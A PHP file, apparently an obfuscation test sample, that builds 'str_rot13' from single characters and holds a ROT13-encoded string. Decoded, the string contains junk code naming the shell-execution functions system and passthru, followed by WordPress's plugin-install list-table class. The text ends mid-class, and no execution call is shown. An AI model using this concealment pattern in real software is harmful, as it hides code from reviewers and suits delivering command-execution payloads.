<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Cyhtva_Vafgnyy_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat cyhtvaf gb vafgnyy va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Cyhtva_Vafgnyy_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	choyvp $beqre   = 'NFP';
	choyvp $beqreol = ahyy;
	choyvp $tebhcf  = neenl();

	cevingr $reebe;

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'vafgnyy_cyhtvaf' );
	}

	/**
	 * Ergheaf gur yvfg bs xabja cyhtvaf.
	 *
	 * Hfrf gur genafvrag qngn sebz gur hcqngrf NCV gb qrgrezvar gur xabja
	 * vafgnyyrq cyhtvaf.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_vafgnyyrq_cyhtvaf() {
		$cyhtvaf = neenl();

		$cyhtva_vasb = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );
		vs ( vffrg( $cyhtva_vasb->ab_hcqngr ) ) {
			sbernpu ( $cyhtva_vasb->ab_hcqngr nf $cyhtva ) {
				vs ( vffrg( $cyhtva->fyht ) ) {
					$cyhtva->hctenqr          = snyfr;
					$cyhtvaf[ $cyhtva->fyht ] = $cyhtva;
				}
			}
		}

		vs ( vffrg( $cyhtva_vasb->erfcbafr ) ) {
			sbernpu ( $cyhtva_vasb->erfcbafr nf $cyhtva ) {
				vs ( vffrg( $cyhtva->fyht ) ) {
					$cyhtva->hctenqr          = gehr;
					$cyhtvaf[ $cyhtva->fyht ] = $cyhtva;
				}
			}
		}

		erghea $cyhtvaf;
	}

	/**
	 * Ergheaf n yvfg bs fyhtf bs vafgnyyrq cyhtvaf, vs xabja.
	 *
	 * Hfrf gur genafvrag qngn sebz gur hcqngrf NCV gb qrgrezvar gur fyhtf bs
	 * xabja vafgnyyrq cyhtvaf. Guvf zvtug or orggre ryfrjurer, creuncf rira
	 * jvguva trg_cyhtvaf().
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_vafgnyyrq_cyhtva_fyhtf() {
		erghea neenl_xrlf( $guvf->trg_vafgnyyrq_cyhtvaf() );
	}

	/**
	 * @tybony neenl  $gnof
	 * @tybony fgevat $gno
	 * @tybony vag    $cntrq
	 * @tybony fgevat $glcr
	 * @tybony fgevat $grez
	 */
	choyvp shapgvba cercner_vgrzf() {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva-vafgnyy.cuc';

		tybony $gnof, $gno, $cntrq, $glcr, $grez;

		$gno = ! rzcgl( $_ERDHRFG['gno'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['gno'] ) : '';

		$cntrq = $guvf->trg_cntrahz();

		$cre_cntr = 36;

		// Gurfr ner gur gnof juvpu ner fubja ba gur cntr.
		$gnof = neenl();

		vs ( 'frnepu' === $gno ) {
			$gnof['frnepu'] = __( 'Frnepu Erfhygf' );
		}

		vs ( 'orgn' === $gno || fge_pbagnvaf( trg_oybtvasb( 'irefvba' ), '-' ) ) {
			$gnof['orgn'] = _k( 'Orgn Grfgvat', 'Cyhtva Vafgnyyre' );
		}

		$gnof['srngherq']    = _k( 'Srngherq', 'Cyhtva Vafgnyyre' );
		$gnof['cbchyne']     = _k( 'Cbchyne', 'Cyhtva Vafgnyyre' );
		$gnof['erpbzzraqrq'] = _k( 'Erpbzzraqrq', 'Cyhtva Vafgnyyre' );
		$gnof['snibevgrf']   = _k( 'Snibevgrf', 'Cyhtva Vafgnyyre' );

		vs ( pheerag_hfre_pna( 'hcybnq_cyhtvaf' ) ) {
			/*
			 * Ab ybatre n erny gno. Urer sbe svygre pbzcngvovyvgl.
			 * Trgf fxvccrq va trg_ivrjf().
			 */
			$gnof['hcybnq'] = __( 'Hcybnq Cyhtva' );
		}

		$abazrah_gnof = neenl( 'cyhtva-vasbezngvba' ); // Inyvq npgvbaf gb cresbez juvpu qb abg unir n Zrah vgrz.

		/**
		 * Svygref gur gnof fubja ba gur Nqq Cyhtvaf fperra.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat[] $gnof Gur gnof fubja ba gur Nqq Cyhtvaf fperra. Qrsnhygf vapyhqr
		 *                       'srngherq', 'cbchyne', 'erpbzzraqrq', 'snibevgrf', naq 'hcybnq'.
		 */
		$gnof = nccyl_svygref( 'vafgnyy_cyhtvaf_gnof', $gnof );

		/**
		 * Svygref gnof abg nffbpvngrq jvgu n zrah vgrz ba gur Nqq Cyhtvaf fperra.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat[] $abazrah_gnof Gur gnof gung qba'g unir n zrah vgrz ba gur Nqq Cyhtvaf fperra.
		 */
		$abazrah_gnof = nccyl_svygref( 'vafgnyy_cyhtvaf_abazrah_gnof', $abazrah_gnof );

		// Vs n aba-inyvq zrah gno unf orra fryrpgrq, Naq vg'f abg n aba-zrah npgvba.
		vs ( rzcgl( $gno ) || ( ! vffrg( $gnof[ $gno ] ) && ! va_neenl( $gno, (neenl) $abazrah_gnof, gehr ) ) ) {
			$gno = xrl( $gnof );
		}

		$vafgnyyrq_cyhtvaf = $guvf->trg_vafgnyyrq_cyhtvaf();

		$netf = neenl(
			'cntr'     => $cntrq,
			'cre_cntr' => $cre_cntr,
			// Fraq gur ybpnyr gb gur NCV fb vg pna cebivqr pbagrkg-frafvgvir erfhygf.
			'ybpnyr'   => trg_hfre_ybpnyr(),
		);

		fjvgpu ( $gno ) {
			pnfr 'frnepu':
				$glcr = vffrg( $_ERDHRFG['glcr'] ) ? jc_hafynfu( $_ERDHRFG['glcr'] ) : 'grez';
				$grez = vffrg( $_ERDHRFG['f'] ) ? jc_hafynfu( $_ERDHRFG['f'] ) : '';

				fjvgpu ( $glcr ) {
					pnfr 'gnt':
						$netf['gnt'] = fnavgvmr_gvgyr_jvgu_qnfurf( $grez );
						oernx;
					pnfr 'grez':
						$netf['frnepu'] = $grez;
						oernx;
					pnfr 'nhgube':
						$netf['nhgube'] = $grez;
						oernx;
				}

				oernx;

			pnfr 'srngherq':
			pnfr 'cbchyne':
			pnfr 'arj':
			pnfr 'orgn':
				$netf['oebjfr'] = $gno;
				oernx;
			pnfr 'erpbzzraqrq':
				$netf['oebjfr'] = $gno;
				// Vapyhqr gur yvfg bs vafgnyyrq cyhtvaf fb jr pna trg eryrinag erfhygf.
				$netf['vafgnyyrq_cyhtvaf'] = neenl_xrlf( $vafgnyyrq_cyhtvaf );
				oernx;

			pnfr 'snibevgrf':
				$npgvba = 'fnir_jcbet_hfreanzr_' . trg_pheerag_hfre_vq();
				vs ( vffrg( $_TRG['_jcabapr'] ) && jc_irevsl_abapr( jc_hafynfu( $_TRG['_jcabapr'] ), $npgvba ) ) {
					$hfre = vffrg( $_TRG['hfre'] ) ? jc_hafynfu( $_TRG['hfre'] ) : trg_hfre_bcgvba( 'jcbet_snibevgrf' );

					// Vs gur fnir hey cnenzrgre vf cnffrq jvgu n snyfrl inyhr, qba'g fnir gur snibevgr hfre.
					vs ( ! vffrg( $_TRG['fnir'] ) || $_TRG['fnir'] ) {
						hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'jcbet_snibevgrf', $hfre );
					}
				} ryfr {
					$hfre = trg_hfre_bcgvba( 'jcbet_snibevgrf' );
				}
				vs ( $hfre ) {
					$netf['hfre'] = $hfre;
				} ryfr {
					$netf = snyfr;
				}

				nqq_npgvba( 'vafgnyy_cyhtvaf_snibevgrf', 'vafgnyy_cyhtvaf_snibevgrf_sbez', 9, 0 );
				oernx;

			qrsnhyg:
				$netf = snyfr;
				oernx;
		}

		/**
		 * Svygref NCV erdhrfg nethzragf sbe rnpu Nqq Cyhtvaf fperra gno.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gno`, ersref gb gur cyhtva vafgnyy gnof.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_snibevgrf`
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_srngherq`
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_cbchyne`
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_erpbzzraqrq`
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_hcybnq`
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_frnepu`
		 *  - `vafgnyy_cyhtvaf_gnoyr_ncv_netf_orgn`
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz neenl|snyfr $netf Cyhtva vafgnyy NCV nethzragf.
		 */
		$netf = nccyl_svygref( \"vafgnyy_cyhtvaf_gnoyr_ncv_netf_{$gno}\", $netf );

		vs ( ! $netf ) {
			erghea;
		}

		$ncv = cyhtvaf_ncv( 'dhrel_cyhtvaf', $netf );

		vs ( vf_jc_reebe( $ncv ) ) {
			$guvf->reebe = $ncv;
			erghea;
		}

		$guvf->vgrzf = $ncv->cyhtvaf;

		vs ( $guvf->beqreol ) {
			hnfbeg( $guvf->vgrzf, neenl( $guvf, 'beqre_pnyyonpx' ) );
		}

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $ncv->vasb['erfhygf'],
				'cre_cntr'    => $netf['cre_cntr'],
			)
		);

		vs ( vffrg( $ncv->vasb['tebhcf'] ) ) {
			$guvf->tebhcf = $ncv->vasb['tebhcf'];
		}

		vs ( $vafgnyyrq_cyhtvaf ) {
			$wf_cyhtvaf = neenl_svyy_xrlf(
				neenl( 'nyy', 'frnepu', 'npgvir', 'vanpgvir', 'erpragyl_npgvingrq', 'zhfghfr', 'qebcvaf' ),
				neenl()
			);

			$wf_cyhtvaf['nyy'] = neenl_inyhrf( jc_yvfg_cyhpx( $vafgnyyrq_cyhtvaf, 'cyhtva' ) );
			$hctenqr_cyhtvaf   = jc_svygre_bowrpg_yvfg( $vafgnyyrq_cyhtvaf, neenl( 'hctenqr' => gehr ), 'naq', 'cyhtva' );

			vs ( $hctenqr_cyhtvaf ) {
				$wf_cyhtvaf['hctenqr'] = neenl_inyhrf( $hctenqr_cyhtvaf );
			}

			jc_ybpnyvmr_fpevcg(
				'hcqngrf',
				'_jcHcqngrfVgrzPbhagf',
				neenl(
					'cyhtvaf' => $wf_cyhtvaf,
					'gbgnyf'  => jc_trg_hcqngr_qngn(),
				)
			);
		}
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		vs ( vffrg( $guvf->reebe ) ) {
			$reebe_zrffntr  = '<c>' . $guvf->reebe->trg_reebe_zrffntr() . '</c>';
			$reebe_zrffntr .= '<c pynff=\"uvqr-vs-ab-wf\"><ohggba pynff=\"ohggba gel-ntnva\">' . __( 'Gel Ntnva' ) . '</ohggba></c>';
			jc_nqzva_abgvpr(
				$reebe_zrffntr,
				neenl(
					'nqqvgvbany_pynffrf' => neenl( 'vayvar', 'reebe' ),
					'cnentencu_jenc'     => snyfr,
				)
			);
			?>
		<?cuc } ryfr { ?>
			<qvi pynff=\"ab-cyhtva-erfhygf\"><?cuc _r( 'Ab cyhtvaf sbhaq. Gel n qvssrerag frnepu.' ); ?></qvi>
			<?cuc
		}
	}

	/**
	 * @tybony neenl $gnof
	 * @tybony fgevat $gno
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $gnof, $gno;

		$qvfcynl_gnof = neenl();
		sbernpu ( (neenl) $gnof nf $npgvba => $grkg ) {
			$qvfcynl_gnof[ 'cyhtva-vafgnyy-' . $npgvba ] = neenl(
				'hey'     => frys_nqzva_hey( 'cyhtva-vafgnyy.cuc?gno=' . $npgvba ),
				'ynory'   => $grkg,
				'pheerag' => $npgvba === $gno,
			);
		}
		// Ab ybatre n erny gno.
		hafrg( $qvfcynl_gnof['cyhtva-vafgnyy-hcybnq'] );

		erghea $guvf->trg_ivrjf_yvaxf( $qvfcynl_gnof );
	}

	/**
	 * Bireevqrf cnerag ivrjf fb jr pna hfr gur svygre one qvfcynl.
	 */
	choyvp shapgvba ivrjf() {
		$ivrjf = $guvf->trg_ivrjf();

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-yvfg-gnoyr.cuc */
		$ivrjf = nccyl_svygref( \"ivrjf_{$guvf->fperra->vq}\", $ivrjf );

		$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_ivrjf' );
		?>
<qvi pynff=\"jc-svygre\">
	<hy pynff=\"svygre-yvaxf\">
		<?cuc
		vs ( ! rzcgl( $ivrjf ) ) {
			sbernpu ( $ivrjf nf $pynff => $ivrj ) {
				$ivrjf[ $pynff ] = \"\g<yv pynff='$pynff'>$ivrj\";
			}
			rpub vzcybqr( \" </yv>\a\", $ivrjf ) . \"</yv>\a\";
		}
		?>
	</hy>

		<?cuc vafgnyy_frnepu_sbez(); ?>
</qvi>
		<?cuc
	}

	/**
	 * Qvfcynlf gur cyhtva vafgnyy gnoyr.
	 *
	 * Bireevqrf gur cnerag qvfcynl() zrgubq gb cebivqr n qvssrerag pbagnvare.
	 *
	 * @fvapr 4.0.0
	 */
	choyvp shapgvba qvfcynl() {
		$fvathyne = $guvf->_netf['fvathyne'];

		$qngn_ngge = '';

		vs ( $fvathyne ) {
			$qngn_ngge = \" qngn-jc-yvfgf='yvfg:$fvathyne'\";
		}

		$guvf->qvfcynl_gnoyrani( 'gbc' );

		?>
<qvi pynff=\"jc-yvfg-gnoyr <?cuc rpub vzcybqr( ' ', $guvf->trg_gnoyr_pynffrf() ); ?>\">
		<?cuc
		$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_yvfg' );
		?>
	<qvi vq=\"gur-yvfg\"<?cuc rpub $qngn_ngge; ?>>
		<?cuc $guvf->qvfcynl_ebjf_be_cynprubyqre(); ?>
	</qvi>
</qvi>
		<?cuc
		$guvf->qvfcynl_gnoyrani( 'obggbz' );
	}

	/**
	 * @tybony fgevat $gno
	 *
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba qvfcynl_gnoyrani( $juvpu ) {
		vs ( 'srngherq' === $TYBONYF['gno'] ) {
			erghea;
		}

		vs ( 'gbc' === $juvpu ) {
			jc_ersrere_svryq();
			?>
			<qvi pynff=\"gnoyrani gbc\">
				<qvi pynff=\"nyvtayrsg npgvbaf\">
					<?cuc
					/**
					 * Sverf orsber gur Cyhtva Vafgnyy gnoyr urnqre cntvangvba vf qvfcynlrq.
					 *
					 * @fvapr 2.7.0
					 */
					qb_npgvba( 'vafgnyy_cyhtvaf_gnoyr_urnqre' );
					?>
				</qvi>
				<?cuc $guvf->cntvangvba( $juvpu ); ?>
				<oe pynff=\"pyrne\" />
			</qvi>
		<?cuc } ryfr { ?>
			<qvi pynff=\"gnoyrani obggbz\">
				<?cuc $guvf->cntvangvba( $juvpu ); ?>
				<oe pynff=\"pyrne\" />
			</qvi>
			<?cuc
		}
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_gnoyr_pynffrf() {
		erghea neenl( 'jvqrsng', $guvf->_netf['cyheny'] );
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		erghea neenl();
	}

	/**
	 * @cnenz bowrpg $cyhtva_n
	 * @cnenz bowrpg $cyhtva_o
	 * @erghea vag
	 */
	cevingr shapgvba beqre_pnyyonpx( $cyhtva_n, $cyhtva_o ) {
		$beqreol = $guvf->beqreol;
		vs ( ! vffrg( $cyhtva_n->$beqreol, $cyhtva_o->$beqreol ) ) {
			erghea 0;
		}

		$n = $cyhtva_n->$beqreol;
		$o = $cyhtva_o->$beqreol;

		vs ( $n === $o ) {
			erghea 0;
		}

		vs ( 'QRFP' === $guvf->beqre ) {
			erghea ( $n < $o ) ? 1 : -1;
		} ryfr {
			erghea ( $n < $o ) ? -1 : 1;
		}
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		$cyhtvaf_nyybjrqgntf = neenl(
			'n'       => neenl(
				'uers'   => neenl(),
				'gvgyr'  => neenl(),
				'gnetrg' => neenl(),
			),
			'nooe'    => neenl( 'gvgyr' => neenl() ),
			'npebalz' => neenl( 'gvgyr' => neenl() ),
			'pbqr'    => neenl(),
			'cer'     => neenl(),
			'rz'      => neenl(),
			'fgebat'  => neenl(),
			'hy'      => neenl(),
			'by'      => neenl(),
			'yv'      => neenl(),
			'c'       => neenl(),
			'oe'      => neenl(),
		);

		$cyhtvaf_tebhc_gvgyrf = neenl(
			'Cresbeznapr' => _k( 'Cresbeznapr', 'Cyhtva vafgnyyre tebhc gvgyr' ),
			'Fbpvny'      => _k( 'Fbpvny', 'Cyhtva vafgnyyre tebhc gvgyr' ),
			'Gbbyf'       => _k( 'Gbbyf', 'Cyhtva vafgnyyre tebhc gvgyr' ),
		);

		$tebhc = ahyy;

		sbernpu ( (neenl) $guvf->vgrzf nf $cyhtva ) {
			vs ( vf_bowrpg( $cyhtva ) ) {
				$cyhtva = (neenl) $cyhtva;
			}

			// Qvfcynl gur tebhc urnqvat vs gurer vf bar.
			vs ( vffrg( $cyhtva['tebhc'] ) && $cyhtva['tebhc'] !== $tebhc ) {
				vs ( vffrg( $guvf->tebhcf[ $cyhtva['tebhc'] ] ) ) {
					$tebhc_anzr = $guvf->tebhcf[ $cyhtva['tebhc'] ];
					vs ( vffrg( $cyhtvaf_tebhc_gvgyrf[ $tebhc_anzr ] ) ) {
						$tebhc_anzr = $cyhtvaf_tebhc_gvgyrf[ $tebhc_anzr ];
					}
				} ryfr {
					$tebhc_anzr = $cyhtva['tebhc'];
				}

				// Fgnegvat n arj tebhc, pybfr bss gur qvif bs gur ynfg bar.
				vs ( ! rzcgl( $tebhc ) ) {
					rpub '</qvi></qvi>';
				}

				rpub '<qvi pynff=\"cyhtva-tebhc\"><u3>' . rfp_ugzy( $tebhc_anzr ) . '</u3>';
				// Arrqf na rkgen jenccvat qvi sbe agu-puvyq fryrpgbef gb jbex.
				rpub '<qvi pynff=\"cyhtva-vgrzf\">';

				$tebhc = $cyhtva['tebhc'];
			}

			$gvgyr = jc_xfrf( $cyhtva['anzr'], $cyhtvaf_nyybjrqgntf );

			// Erzbir nal UGZY sebz gur qrfpevcgvba.
			$qrfpevcgvba = fgevc_gntf( $cyhtva['fubeg_qrfpevcgvba'] );

			/**
			 * Svygref gur cyhtva pneq qrfpevcgvba ba gur Nqq Cyhtvaf fperra.
			 *
			 * @fvapr 6.0.0
			 *
			 * @cnenz fgevat $qrfpevcgvba Cyhtva pneq qrfpevcgvba.
			 * @cnenz neenl  $cyhtva      Na neenl bs cyhtva qngn. Frr {@frr cyhtvaf_ncv()}
			 *                            sbe gur yvfg bs cbffvoyr inyhrf.
			 */
			$qrfpevcgvba = nccyl_svygref( 'cyhtva_vafgnyy_qrfpevcgvba', $qrfpevcgvba, $cyhtva );

			$irefvba = jc_xfrf( $cyhtva['irefvba'], $cyhtvaf_nyybjrqgntf );

			$anzr = fgevc_gntf( $gvgyr . ' ' . $irefvba );

			$nhgube = jc_xfrf( $cyhtva['nhgube'], $cyhtvaf_nyybjrqgntf );
			vs ( ! rzcgl( $nhgube ) ) {
				/* genafyngbef: %f: Cyhtva nhgube. */
				$nhgube = ' <pvgr>' . fcevags( __( 'Ol %f' ), $nhgube ) . '</pvgr>';
			}

			$erdhverf_cuc = vffrg( $cyhtva['erdhverf_cuc'] ) ? $cyhtva['erdhverf_cuc'] : ahyy;
			$erdhverf_jc  = vffrg( $cyhtva['erdhverf'] ) ? $cyhtva['erdhverf'] : ahyy;

			$pbzcngvoyr_cuc = vf_cuc_irefvba_pbzcngvoyr( $erdhverf_cuc );
			$pbzcngvoyr_jc  = vf_jc_irefvba_pbzcngvoyr( $erdhverf_jc );
			$grfgrq_jc      = ( rzcgl( $cyhtva['grfgrq'] ) || irefvba_pbzcner( trg_oybtvasb( 'irefvba' ), $cyhtva['grfgrq'], '<=' ) );

			$npgvba_yvaxf = neenl();

			$npgvba_yvaxf[] = jc_trg_cyhtva_npgvba_ohggba( $anzr, $cyhtva, $pbzcngvoyr_cuc, $pbzcngvoyr_jc );

			$qrgnvyf_yvax = frys_nqzva_hey(
				'cyhtva-vafgnyy.cuc?gno=cyhtva-vasbezngvba&nzc;cyhtva=' . $cyhtva['fyht'] .
				'&nzc;GO_vsenzr=gehr&nzc;jvqgu=600&nzc;urvtug=550'
			);

			$npgvba_yvaxf[] = fcevags(
				'<n uers=\"%f\" pynff=\"guvpxobk bcra-cyhtva-qrgnvyf-zbqny\" nevn-ynory=\"%f\" qngn-gvgyr=\"%f\">%f</n>',
				rfp_hey( $qrgnvyf_yvax ),
				/* genafyngbef: %f: Cyhtva anzr naq irefvba. */
				rfp_ngge( fcevags( __( 'Zber vasbezngvba nobhg %f' ), $anzr ) ),
				rfp_ngge( $anzr ),
				__( 'Zber Qrgnvyf' )
			);

			vs ( ! rzcgl( $cyhtva['vpbaf']['fit'] ) ) {
				$cyhtva_vpba_hey = $cyhtva['vpbaf']['fit'];
			} ryfrvs ( ! rzcgl( $cyhtva['vpbaf']['2k'] ) ) {
				$cyhtva_vpba_hey = $cyhtva['vpbaf']['2k'];
			} ryfrvs ( ! rzcgl( $cyhtva['vpbaf']['1k'] ) ) {
				$cyhtva_vpba_hey = $cyhtva['vpbaf']['1k'];
			} ryfr {
				$cyhtva_vpba_hey = $cyhtva['vpbaf']['qrsnhyg'];
			}

			/**
			 * Svygref gur vafgnyy npgvba yvaxf sbe n cyhtva.
			 *
			 * @fvapr 2.7.0
			 *
			 * @cnenz fgevat[] $npgvba_yvaxf Na neenl bs cyhtva npgvba yvaxf.
			 *                               Qrsnhygf ner yvaxf gb Qrgnvyf naq Vafgnyy Abj.
			 * @cnenz neenl    $cyhtva       Na neenl bs cyhtva qngn. Frr {@frr cyhtvaf_ncv()}
			 *                               sbe gur yvfg bs cbffvoyr inyhrf.
			 */
			$npgvba_yvaxf = nccyl_svygref( 'cyhtva_vafgnyy_npgvba_yvaxf', $npgvba_yvaxf, $cyhtva );

			$ynfg_hcqngrq_gvzrfgnzc = fgegbgvzr( $cyhtva['ynfg_hcqngrq'] );
			?>
		<qvi pynff=\"cyhtva-pneq cyhtva-pneq-<?cuc rpub fnavgvmr_ugzy_pynff( $cyhtva['fyht'] ); ?>\">
			<?cuc
			vs ( ! $pbzcngvoyr_cuc || ! $pbzcngvoyr_jc ) {
				$vapbzcngvoyr_abgvpr_zrffntr = '';
				vs ( ! $pbzcngvoyr_cuc && ! $pbzcngvoyr_jc ) {
					$vapbzcngvoyr_abgvpr_zrffntr .= __( 'Guvf cyhtva qbrf abg jbex jvgu lbhe irefvbaf bs JbeqCerff naq CUC.' );
					vs ( pheerag_hfre_pna( 'hcqngr_pber' ) && pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
						$vapbzcngvoyr_abgvpr_zrffntr .= fcevags(
							/* genafyngbef: 1: HEY gb JbeqCerff Hcqngrf fperra, 2: HEY gb Hcqngr CUC cntr. */
							' ' . __( '<n uers=\"%1$f\">Cyrnfr hcqngr JbeqCerff</n>, naq gura <n uers=\"%2$f\">yrnea zber nobhg hcqngvat CUC</n>.' ),
							frys_nqzva_hey( 'hcqngr-pber.cuc' ),
							rfp_hey( jc_trg_hcqngr_cuc_hey() )
						);
						$vapbzcngvoyr_abgvpr_zrffntr .= jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>', snyfr );
					} ryfrvs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
						$vapbzcngvoyr_abgvpr_zrffntr .= fcevags(
							/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
							' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
							frys_nqzva_hey( 'hcqngr-pber.cuc' )
						);
					} ryfrvs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
						$vapbzcngvoyr_abgvpr_zrffntr .= fcevags(
							/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
							' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
							rfp_hey( jc_trg_hcqngr_cuc_hey() )
						);
						$vapbzcngvoyr_abgvpr_zrffntr .= jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>', snyfr );
					}
				} ryfrvs ( ! $pbzcngvoyr_jc ) {
					$vapbzcngvoyr_abgvpr_zrffntr .= __( 'Guvf cyhtva qbrf abg jbex jvgu lbhe irefvba bs JbeqCerff.' );
					vs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
						$vapbzcngvoyr_abgvpr_zrffntr .= fcevags(
							/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
							' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
							frys_nqzva_hey( 'hcqngr-pber.cuc' )
						);
					}
				} ryfrvs ( ! $pbzcngvoyr_cuc ) {
					$vapbzcngvoyr_abgvpr_zrffntr .= __( 'Guvf cyhtva qbrf abg jbex jvgu lbhe irefvba bs CUC.' );
					vs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
						$vapbzcngvoyr_abgvpr_zrffntr .= fcevags(
							/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
							' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
							rfp_hey( jc_trg_hcqngr_cuc_hey() )
						);
						$vapbzcngvoyr_abgvpr_zrffntr .= jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>', snyfr );
					}
				}

				jc_nqzva_abgvpr(
					$vapbzcngvoyr_abgvpr_zrffntr,
					neenl(
						'glcr'               => 'reebe',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg', 'vayvar' ),
					)
				);
			}
			?>
			<qvi pynff=\"cyhtva-pneq-gbc\">
				<qvi pynff=\"anzr pbyhza-anzr\">
					<u3>
						<n uers=\"<?cuc rpub rfp_hey( $qrgnvyf_yvax ); ?>\" pynff=\"guvpxobk bcra-cyhtva-qrgnvyf-zbqny\">
						<?cuc rpub $gvgyr; ?>
						<vzt fep=\"<?cuc rpub rfp_hey( $cyhtva_vpba_hey ); ?>\" pynff=\"cyhtva-vpba\" nyg=\"\" />
						</n>
					</u3>
				</qvi>
				<qvi pynff=\"npgvba-yvaxf\">
					<?cuc
					vs ( $npgvba_yvaxf ) {
						rpub '<hy pynff=\"cyhtva-npgvba-ohggbaf\"><yv>' . vzcybqr( '</yv><yv>', $npgvba_yvaxf ) . '</yv></hy>';
					}
					?>
				</qvi>
				<qvi pynff=\"qrfp pbyhza-qrfpevcgvba\">
					<c><?cuc rpub $qrfpevcgvba; ?></c>
					<c pynff=\"nhgubef\"><?cuc rpub $nhgube; ?></c>
				</qvi>
			</qvi>
			<?cuc
			$qrcraqrapvrf_abgvpr = $guvf->trg_qrcraqrapvrf_abgvpr( $cyhtva );
			vs ( ! rzcgl( $qrcraqrapvrf_abgvpr ) ) {
				rpub $qrcraqrapvrf_abgvpr;
			}
			?>
			<qvi pynff=\"cyhtva-pneq-obggbz\">
				<qvi pynff=\"iref pbyhza-engvat\">
					<?cuc
					jc_fgne_engvat(
						neenl(
							'engvat' => $cyhtva['engvat'],
							'glcr'   => 'creprag',
							'ahzore' => $cyhtva['ahz_engvatf'],
						)
					);
					?>
					<fcna pynff=\"ahz-engvatf\" nevn-uvqqra=\"gehr\">(<?cuc rpub ahzore_sbezng_v18a( $cyhtva['ahz_engvatf'] ); ?>)</fcna>
				</qvi>
				<qvi pynff=\"pbyhza-hcqngrq\">
					<fgebat><?cuc _r( 'Ynfg Hcqngrq:' ); ?></fgebat>
					<?cuc
						/* genafyngbef: %f: Uhzna-ernqnoyr gvzr qvssrerapr. */
						cevags( __( '%f ntb' ), uhzna_gvzr_qvss( $ynfg_hcqngrq_gvzrfgnzc ) );
					?>
				</qvi>
				<qvi pynff=\"pbyhza-qbjaybnqrq\">
					<?cuc
					vs ( $cyhtva['npgvir_vafgnyyf'] >= 1000000 ) {
						$npgvir_vafgnyyf_zvyyvbaf = sybbe( $cyhtva['npgvir_vafgnyyf'] / 1000000 );
						$npgvir_vafgnyyf_grkg     = fcevags(
							/* genafyngbef: %f: Ahzore bs zvyyvbaf. */
							_ak( '%f+ Zvyyvba', '%f+ Zvyyvba', $npgvir_vafgnyyf_zvyyvbaf, 'Npgvir cyhtva vafgnyyngvbaf' ),
							ahzore_sbezng_v18a( $npgvir_vafgnyyf_zvyyvbaf )
						);
					} ryfrvs ( 0 === $cyhtva['npgvir_vafgnyyf'] ) {
